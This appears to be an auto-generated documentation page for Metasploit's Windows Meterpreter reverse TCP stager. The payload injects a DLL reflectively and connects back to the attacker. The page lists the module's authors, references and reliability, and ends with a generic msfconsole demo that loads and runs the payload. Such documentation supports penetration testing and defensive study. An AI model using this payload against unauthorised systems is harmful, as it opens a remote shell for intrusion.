## Windows Meterpreter (Reflective Injection), Reverse TCP Stager

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged). Connect back to the attacker


## Module Name
payload/windows/meterpreter/reverse_tcp

## Authors
* skape
* sf
* OJ Reeves
* hdm


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/meterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    